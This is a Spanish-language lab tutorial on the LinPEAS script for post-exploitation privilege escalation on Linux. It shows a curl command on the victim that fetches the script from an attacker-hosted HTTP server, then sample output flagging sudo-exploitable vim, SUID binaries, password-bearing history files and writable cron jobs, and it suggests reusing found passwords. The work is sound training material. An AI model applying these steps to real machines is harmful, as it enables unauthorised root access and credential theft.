
---

# Laboratorio de escalada de privilegios con LinPEAS

> `LinPEAS` es un script automatizado que nos ayuda a identificar posibles vectores de escalada de privilegios en sistemas Linux. Forma parte del conjunto de herramientas PEASS-ng (Privilege Escalation Awesome Scripts Suite).

---

## 1. ¿Qué es LinPEAS y para qué sirve?

`LinPEAS` realiza un escaneo completo del sistema en busca de:

- Binarios con permisos `SUID` inseguros
- Comandos permitidos vía `sudo`
- Servicios con configuraciones inseguras
- Archivos con permisos peligrosos
- Credenciales expuestas
- Archivos de configuración mal gestionados

Es especialmente útil durante la fase de **post-explotación**, tras haber obtenido acceso a una máquina víctima.

---

## 2. Descarga de LinPEAS

**Acción (en nuestra máquina atacante):**

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
python3 -m http.server 1234
````

**Explicación:**  
Descargamos `linpeas.sh` desde el repositorio oficial de GitHub y lo servimos con un servidor HTTP para transferirlo a la máquina víctima.

---

## 3. Transferencia a la máquina víctima

**Acción (en la máquina víctima):**

```bash
curl http://<IP_local>:1234/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
```

**Resultado:**

```bash
-rwxr-xr-x 1 Metahumo Metahumo 400K Jun 14 15:30 linpeas.sh
```

**Explicación:**  
Transferimos el script `linpeas.sh` desde nuestra máquina atacante a la víctima y le damos permisos de ejecución.

---

## 4. Ejecución de LinPEAS

**Acción (como usuario con acceso limitado, por ejemplo `Metahumo`):**

```bash
./linpeas.sh
```

**Resultado (resumen):**

```bash
[+] Checking for SUID binaries...
[+] Checking sudo permissions...
[+] Interesting files...
[+] Writable cron jobs...
[+] Potential password in bash history...
...
```

**Explicación:**  
El script realiza múltiples chequeos y muestra con colores los posibles hallazgos más relevantes (por ejemplo, binarios sudo aprovechables, ficheros `.bash_history` con credenciales, servicios vulnerables, etc.).

---

## 5. Detección de binarios sudo explotables con LinPEAS

**Acción (dentro del output de LinPEAS):**

Buscar una sección similar a:

```bash
╔══════════╣ Sudo -l (privileged)
╚══════════
Matching Defaults entries for Metahumo on ubuntu:
    env_reset, mail_badpass, secure_path=...

User Metahumo may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/vim
```

**Explicación:**  
LinPEAS automáticamente ejecuta `sudo -l` y nos muestra qué comandos podemos ejecutar como root. Esta información puede cruzarse fácilmente con GTFOBins para confirmar su explotación.

---

## 6. Detección de binarios con SUID

**Ejemplo del output:**

```bash
-rwsr-xr-x 1 root root 123K /usr/bin/find
-rwsr-xr-x 1 root root 234K /usr/bin/vim.basic
```

**Explicación:**  
Los binarios marcados con `SUID` se ejecutan con los privilegios de su propietario (normalmente `root`). Algunos de estos binarios, si son vulnerables o mal configurados, pueden usarse para obtener acceso privilegiado.

---

## 7. Detección de archivos con contraseñas o credenciales

**Ejemplo del output:**

```bash
[+] Searching for passwords in config files
/home/Metahumo/.mysql_history
/home/Metahumo/.bash_history
...
```

**Explicación:**  
LinPEAS busca patrones comunes de contraseñas en archivos de configuración y shell histories. Si encontramos contraseñas, podemos intentar su reutilización en otros servicios o combinarlas con `sudo`.

---

## 8. Detección de cron jobs vulnerables

**Ejemplo del output:**

```bash
-rw-r--r-- 1 Metahumo Metahumo 0 Jun 14 15:35 /etc/cron.d/testjob
```

**Explicación:**  
Los cron jobs que son ejecutados como root pero son editables por usuarios sin privilegios son vectores de escalada clásicos.

---

## 9. Conclusiones y buenas prácticas

- LinPEAS es una herramienta muy potente y rápida para evaluar la seguridad local de una máquina Linux tras comprometerla.
    
- Permite detectar múltiples vectores sin necesidad de hacer búsquedas manuales largas.
    
- Los hallazgos deben validarse antes de explotarlos. No todo lo que LinPEAS muestra es explotable directamente.
    
- Se recomienda utilizarlo junto con GTFOBins y `sudo -l` para confirmar técnicas de escalada.
    

---

## 10. Referencias

- LinPEAS: [https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
    
- GTFOBins: [https://gtfobins.github.io](https://gtfobins.github.io/)
    
- Cheatsheet de escalada local: [https://book.hacktricks.xyz/linux-hardening/privilege-escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
    

---

